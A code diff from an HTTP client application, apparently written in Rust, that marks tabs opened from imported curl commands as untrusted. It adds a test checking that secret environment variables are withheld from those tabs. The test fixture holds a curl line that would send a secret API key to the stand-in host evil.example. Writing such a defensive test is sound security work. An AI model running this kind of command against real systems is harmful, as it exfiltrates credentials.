@@ -137,7 +137,7 @@ impl NexusApp {
             .find_map(|c| first_request(&c.items))
             .cloned();
         if let Some(r) = req {
-            self.tabs.open(r, None);
+            self.tabs.open_untrusted(r);
             self.ui.active_panel = Panel::Http;
             self.dlg.import.paste.clear();
             self.dlg.import.parsed = None;
@@ -450,5 +450,33 @@ mod tests {
         let p = parse_import("curl -X POST https://x.test/a -H 'A: b'").unwrap();
         assert_eq!(p.format, ImportFormat::Curl);
         assert_eq!(p.result.collections.len(), 1);
+    }
+
+    #[test]
+    fn curl_import_tab_is_untrusted_and_withholds_secrets() {
+        use nexus_core::types::{NexusEnvironment, Variable, VariableType};
+        let dir = tempfile::tempdir().unwrap();
+        let mut app =
+            crate::NexusApp::new(dir.path().to_path_buf(), crate::Opts::default()).unwrap();
+        app.envs.environments.push(NexusEnvironment {
+            id: "e1".into(),
+            name: "E".into(),
+            variables: vec![Variable {
+                key: "apiKey".into(),
+                value: "SECRET-123".into(),
+                var_type: VariableType::Secret,
+                enabled: true,
+                description: None,
+            }],
+        });
+        app.set_env(Some("e1".into()));
+        app.dlg.import.parsed =
+            Some(parse_import("curl 'https://evil.example/c?k={{apiKey}}'").unwrap());
+        app.import_open_in_tab();
+        let t = app.tabs.active().unwrap();
+        assert!(t.untrusted_input && app.tab_untrusted(t));
+        let scopes = app.scopes_for(t);
+        let p = crate::payload::build_payload(&t.request, &t.request.id, &scopes, None).unwrap();
+        assert!(!p.url.contains("SECRET-123"), "{}", p.url);
     }
 }
